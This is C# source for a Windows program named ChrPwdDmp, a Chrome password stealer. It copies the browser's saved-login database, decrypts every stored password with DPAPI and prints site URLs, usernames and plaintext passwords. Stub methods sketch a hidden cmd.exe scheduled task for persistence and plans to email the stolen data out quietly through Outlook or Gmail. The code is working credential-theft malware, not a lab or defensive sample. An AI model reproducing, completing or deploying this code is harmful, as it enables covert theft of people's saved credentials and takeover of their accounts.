using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Runtime.Serialization.Formatters.Binary;
using Microsoft.Win32.TaskScheduler;

namespace ChrPwdDmp
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml  
    /// </summary>
    public partial class MainWindow : Window
    {
        public string loginData;

        public MainWindow()
        {
            InitializeComponent();
            if (LoginDataExists())
            {
                string temp = Environment.GetEnvironmentVariable("temp") + @"\Login Data";

                // Copy the file to avoid problems opening
                File.Copy(loginData, temp, true);

                string chromePasswords = GetChromePasswords(temp);
                Console.WriteLine(chromePasswords);
                //Application.Current.Shutdown();
            }                            
        }

        private void CopyExe()
        {
            // Place holder
        }

        private void CreateSchTask()
        {
            // Place holder
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C <command line here>";
            process.StartInfo = startInfo;
            process.Start();
        }

        private void EmailLoginData()
        {
            // Place holder
            // Might have a couple options...
            // 1. Use the local Outlook account to send the email (kind of noisy)
            // 2. or setup and use a Gmail account to send the email (might have ports blocked)
        }

        private bool LoginDataExists()
        {
            string userProfile = Environment.GetEnvironmentVariable("userprofile");
            //Console.WriteLine("%USERPROFILE% = " + userProfile);
            loginData = userProfile + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            //Console.WriteLine(loginData);
            return File.Exists(loginData) ? true : false;
        }

        private string GetChromePasswords(string loginData)
        {
            string passwords = null;

            SQLiteConnection myDBConnection = new SQLiteConnection(@"Data Source=" + loginData + ";Version=3;Read Only=True;");
            myDBConnection.Open();

            string query = @"SELECT action_url, username_value, password_value FROM logins";
            SQLiteCommand command = new SQLiteCommand(query, myDBConnection);
            SQLiteDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                // Don't bother if there's not a username
                if ((string)reader["username_value"] != "")
                {                    
                    passwords += "action_url:     " + reader["action_url"] + System.Environment.NewLine;
                    passwords += "username_value: " + reader["username_value"] + System.Environment.NewLine;

                    Byte[] passwordBytes = ProtectedData.Unprotect((Byte[])reader["password_value"], null, DataProtectionScope.CurrentUser);
                    string passwordValue = System.Text.Encoding.Default.GetString(passwordBytes);                    
                    passwords += "password_value: " + passwordValue + System.Environment.NewLine;

                    passwords += System.Environment.NewLine;
                }
            }

            if (passwords != null)
            {
                return passwords;
            }
            else
            {
                return "No passwords found";
            }   
        }
    }
}
